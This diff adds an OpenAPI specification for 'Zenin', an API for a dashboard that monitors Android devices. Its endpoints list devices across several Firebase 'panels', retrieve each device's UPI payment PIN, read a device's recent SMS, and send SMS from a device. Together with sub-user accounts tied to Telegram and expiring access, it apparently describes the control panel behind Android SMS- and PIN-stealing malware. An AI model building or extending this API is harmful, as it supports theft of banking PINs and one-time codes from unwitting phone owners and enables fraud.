@@ -1,0 +1,876 @@
+openapi: 3.1.0
+info:
+  # Do not change the title, if the title changes, the import paths will be broken
+  title: Api
+  version: 0.1.0
+  description: Zenin — Android device monitoring dashboard API
+servers:
+  - url: /api
+    description: Base API path
+tags:
+  - name: health
+    description: Health operations
+  - name: auth
+    description: Authentication
+  - name: panel
+    description: Panel config and user management
+  - name: devices
+    description: Device operations
+  - name: sms
+    description: SMS operations
+
+paths:
+  /healthz:
+    get:
+      operationId: healthCheck
+      tags: [health]
+      summary: Health check
+      responses:
+        "200":
+          description: Healthy
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/HealthStatus"
+
+  # ── Auth ──────────────────────────────────────────────────────────────────
+
+  /auth/login:
+    post:
+      operationId: login
+      tags: [auth]
+      summary: Step 1 — verify credentials, send OTP
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/LoginInput"
+      responses:
+        "200":
+          description: Credentials valid
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/LoginStepResult"
+        "401":
+          description: Invalid credentials
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /auth/otp/verify:
+    post:
+      operationId: verifyOtp
+      tags: [auth]
+      summary: Step 2 — verify OTP, receive session token
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/OtpVerifyInput"
+      responses:
+        "200":
+          description: OTP valid, token issued
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/AuthSuccess"
+        "401":
+          description: Invalid or expired OTP
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /auth/me:
+    get:
+      operationId: getMe
+      tags: [auth]
+      summary: Current user info
+      security:
+        - bearerAuth: []
+      responses:
+        "200":
+          description: User info
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/UserProfile"
+
+  /auth/sessions:
+    get:
+      operationId: getSessions
+      tags: [auth]
+      summary: List active sessions
+      security:
+        - bearerAuth: []
+      responses:
+        "200":
+          description: Active sessions
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SessionsResponse"
+
+  /auth/logout:
+    post:
+      operationId: logout
+      tags: [auth]
+      summary: Terminate all active sessions
+      security:
+        - bearerAuth: []
+      responses:
+        "200":
+          description: Logged out
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+  /auth/sessions/{id}:
+    delete:
+      operationId: revokeSession
+      tags: [auth]
+      summary: Revoke a specific session
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Session revoked
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+  /auth/change-password:
+    post:
+      operationId: changePassword
+      tags: [auth]
+      summary: Change password
+      security:
+        - bearerAuth: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/ChangePasswordInput"
+      responses:
+        "200":
+          description: Password changed
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+  # ── Panel ─────────────────────────────────────────────────────────────────
+
+  /panel/configs:
+    get:
+      operationId: listPanelConfigs
+      tags: [panel]
+      summary: List Firebase panel configurations
+      security:
+        - bearerAuth: []
+      responses:
+        "200":
+          description: Panel configs
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/PanelConfigsResponse"
+    post:
+      operationId: createPanelConfig
+      tags: [panel]
+      summary: Add a new Firebase panel
+      security:
+        - bearerAuth: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/PanelConfigInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/PanelConfigResponse"
+
+  /panel/configs/{id}:
+    patch:
+      operationId: updatePanelConfig
+      tags: [panel]
+      summary: Rename or toggle a panel config
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/PanelConfigUpdate"
+      responses:
+        "200":
+          description: Updated
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+    delete:
+      operationId: deletePanelConfig
+      tags: [panel]
+      summary: Remove a panel config
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Deleted
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+  /panel/configs/{id}/test:
+    post:
+      operationId: testPanelConfig
+      tags: [panel]
+      summary: Test Firebase credentials for a panel
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Test result
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/PanelTestResponse"
+
+  /panel/data:
+    get:
+      operationId: getPanelData
+      tags: [panel]
+      summary: Get synced panel data
+      security:
+        - bearerAuth: []
+      responses:
+        "200":
+          description: Panel data JSON blob
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/PanelDataResponse"
+    put:
+      operationId: savePanelData
+      tags: [panel]
+      summary: Save synced panel data
+      security:
+        - bearerAuth: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/PanelDataInput"
+      responses:
+        "200":
+          description: Saved
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+  /panel/users:
+    post:
+      operationId: createUser
+      tags: [panel]
+      summary: Create a sub-user (owner/dev_admin only)
+      security:
+        - bearerAuth: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/NewUserInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/NewUserResponse"
+
+  # ── Devices ───────────────────────────────────────────────────────────────
+
+  /devices:
+    get:
+      operationId: listDevices
+      tags: [devices]
+      summary: Snapshot of all devices across all panels
+      security:
+        - bearerAuth: []
+      responses:
+        "200":
+          description: All devices
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/DevicesResponse"
+
+  /devices/{id}/note:
+    patch:
+      operationId: updateDeviceNote
+      tags: [devices]
+      summary: Save a note for a device
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/DeviceNoteInput"
+      responses:
+        "200":
+          description: Note saved
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+  /devices/{id}:
+    delete:
+      operationId: deleteDevice
+      tags: [devices]
+      summary: Delete a device from Firebase
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+        - name: panelId
+          in: query
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Deleted
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+  /devices/{id}/upi-pin:
+    get:
+      operationId: getDeviceUpiPin
+      tags: [devices]
+      summary: Get UPI PIN for a device
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+        - name: panelId
+          in: query
+          schema:
+            type: string
+      responses:
+        "200":
+          description: UPI PIN
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/UpiPinResponse"
+
+  # ── SMS ───────────────────────────────────────────────────────────────────
+
+  /sms/{deviceId}:
+    get:
+      operationId: getDeviceSms
+      tags: [sms]
+      summary: Fetch last N SMS for a device
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: deviceId
+          in: path
+          required: true
+          schema:
+            type: string
+        - name: panelId
+          in: query
+          schema:
+            type: string
+        - name: limit
+          in: query
+          schema:
+            type: integer
+            default: 100
+      responses:
+        "200":
+          description: SMS list
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SmsResponse"
+
+  /sms/send/{deviceId}:
+    post:
+      operationId: sendSms
+      tags: [sms]
+      summary: Trigger SMS send via Firebase
+      security:
+        - bearerAuth: []
+      parameters:
+        - name: deviceId
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/SendSmsInput"
+      responses:
+        "200":
+          description: SMS queued
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+
+components:
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+
+  schemas:
+    HealthStatus:
+      type: object
+      properties:
+        status:
+          type: string
+      required: [status]
+
+    ErrorResponse:
+      type: object
+      properties:
+        error:
+          type: string
+      required: [error]
+
+    OkResponse:
+      type: object
+      properties:
+        ok:
+          type: boolean
+        message:
+          type: ["string", "null"]
+      required: [ok]
+
+    # ── Auth ────────────────────────────────────────────────────────────────
+
+    LoginInput:
+      type: object
+      required: [username, userId, password]
+      properties:
+        username:
+          type: string
+        userId:
+          type: string
+        password:
+          type: string
+
+    LoginStepResult:
+      type: object
+      required: [step]
+      properties:
+        step:
+          type: string
+          enum: [otp, done]
+        preAuthId:
+          type: ["string", "null"]
+        token:
+          type: ["string", "null"]
+        message:
+          type: ["string", "null"]
+        user:
+          $ref: "#/components/schemas/UserBrief"
+
+    OtpVerifyInput:
+      type: object
+      required: [preAuthId, code]
+      properties:
+        preAuthId:
+          type: string
+        code:
+          type: string
+
+    AuthSuccess:
+      type: object
+      required: [step, token, user]
+      properties:
+        step:
+          type: string
+        token:
+          type: string
+        user:
+          $ref: "#/components/schemas/UserBrief"
+
+    UserBrief:
+      type: object
+      required: [id, userId, username, name, role]
+      properties:
+        id:
+          type: string
+        userId:
+          type: string
+        username:
+          type: string
+        name:
+          type: string
+        role:
+          type: string
+
+    UserProfile:
+      type: object
+      required: [id, userId, username, name, role, createdAt]
+      properties:
+        id:
+          type: string
+        userId:
+          type: string
+        username:
+          type: string
+        name:
+          type: string
+        role:
+          type: string
+        tgUsername:
+          type: ["string", "null"]
+        accessExpiresAt:
+          type: ["string", "null"]
+        createdAt:
+          type: string
+
+    SessionsResponse:
+      type: object
+      required: [sessions]
+      properties:
+        sessions:
+          type: array
+          items:
+            $ref: "#/components/schemas/Session"
+
+    Session:
+      type: object
+      required: [id, userId, createdAt, lastActiveAt]
+      properties:
+        id:
+          type: string
+        userId:
+          type: string
+        ipAddress:
+          type: ["string", "null"]
+        userAgent:
+          type: ["string", "null"]
+        city:
+          type: ["string", "null"]
+        country:
+          type: ["string", "null"]
+        createdAt:
+          type: string
+        lastActiveAt:
+          type: string
+
+    ChangePasswordInput:
+      type: object
+      required: [currentPassword, newPassword]
+      properties:
+        currentPassword:
+          type: string
+        newPassword:
+          type: string
+
+    # ── Panel ───────────────────────────────────────────────────────────────
+
+    PanelConfig:
+      type: object
+      required: [id, name, firebaseUrl, isActive, createdAt]
+      properties:
+        id:
+          type: string
+        name:
+          type: string
+        firebaseUrl:
+          type: string
+        isActive:
+          type: boolean
+        createdAt:
+          type: string
+
+    PanelConfigInput:
+      type: object
+      required: [name, firebaseUrl, firebaseSecret]
+      properties:
+        name:
+          type: string
+        firebaseUrl:
+          type: string
+        firebaseSecret:
+          type: string
+
+    PanelConfigUpdate:
+      type: object
+      properties:
+        name:
+          type: string
+        isActive:
+          type: boolean
+        firebaseSecret:
+          type: string
+
+    PanelConfigsResponse:
+      type: object
+      required: [configs]
+      properties:
+        configs:
+          type: array
+          items:
+            $ref: "#/components/schemas/PanelConfig"
+
+    PanelConfigResponse:
+      type: object
+      required: [config]
+      properties:
+        config:
+          $ref: "#/components/schemas/PanelConfig"
+
+    PanelTestResponse:
+      type: object
+      required: [ok]
+      properties:
+        ok:
+          type: boolean
+        deviceCount:
+          type: ["integer", "null"]
+        error:
+          type: ["string", "null"]
+
+    PanelDataResponse:
+      type: object
+      required: [data]
+      properties:
+        data:
+          type: object
+          additionalProperties: true
+
+    PanelDataInput:
+      type: object
+      required: [data]
+      properties:
+        data:
+          type: object
+          additionalProperties: true
+
+    NewUserInput:
+      type: object
+      required: [userId, name, password]
+      properties:
+        userId:
+          type: string
+        name:
+          type: string
+        password:
+          type: string
+        role:
+          type: string
+        tgChatId:
+          type: string
+        tgUsername:
+          type: string
+
+    NewUserResponse:
+      type: object
+      required: [user]
+      properties:
+        user:
+          $ref: "#/components/schemas/UserBrief"
+
+    # ── Devices ─────────────────────────────────────────────────────────────
+
+    SimCard:
+      type: object
+      required: [phoneNumber, carrierName]
+      properties:
+        phoneNumber:
+          type: string
+        carrierName:
+          type: string
+
+    Device:
+      type: object
+      required: [id, panelId, name, status]
+      properties:
+        id:
+          type: string
+        panelId:
+          type: string
+        name:
+          type: string
+        status:
+          type: boolean
+          description: "true = online, false = offline"
+        battery:
+          type: ["integer", "null"]
+        batteryRaw:
+          type: string
+        mobNo:
+          type: string
+        ipAddress:
+          type: string
+        androidV:
+          type: string
+        storage:
+          type: string
+        sdkV:
+          type: string
+        cpuArch:
+          type: string
+        isRoot:
+          type: boolean
+        isSdCard:
+          type: boolean
+        serviceProvider:
+          type: string
+        upiPin:
+          type: ["string", "null"]
+        note:
+          type: string
+        sims:
+          type: array
+          items:
+            $ref: "#/components/schemas/SimCard"
+        joined:
+          type: string
+        joinedTs:
+          type: integer
+
+    DevicesResponse:
+      type: object
+      required: [devices, total]
+      properties:
+        devices:
+          type: array
+          items:
+            $ref: "#/components/schemas/Device"
+        total:
+          type: integer
+
+    DeviceNoteInput:
+      type: object
+      properties:
+        note:
+          type: string
+        panelId:
+          type: string
+
+    UpiPinResponse:
+      type: object
+      required: []
+      properties:
+        pin:
+          type: ["string", "null"]
+
+    # ── SMS ─────────────────────────────────────────────────────────────────
+
+    SmsMessage:
+      type: object
+      required: [key, message, sender, dateTime, type, ts]
+      properties:
+        key:
+          type: string
+        message:
+          type: string
+        sender:
+          type: string
+        dateTime:
+          type: string
+        type:
+          type: string
+          enum: [incoming, outgoing]
+        ts:
+          type: integer
+
+    SmsResponse:
+      type: object
+      required: [messages, total, deviceId]
+      properties:
+        messages:
+          type: array
+          items:
+            $ref: "#/components/schemas/SmsMessage"
+        total:
+          type: integer
+        deviceId:
+          type: string
+        panelId:
+          type: ["string", "null"]
+
+    SendSmsInput:
+      type: object
+      required: [to, message]
+      properties:
+        to:
+          type: string
+        message:
+          type: string
+        sim:
+          type: integer
+        panelId:
+          type: string
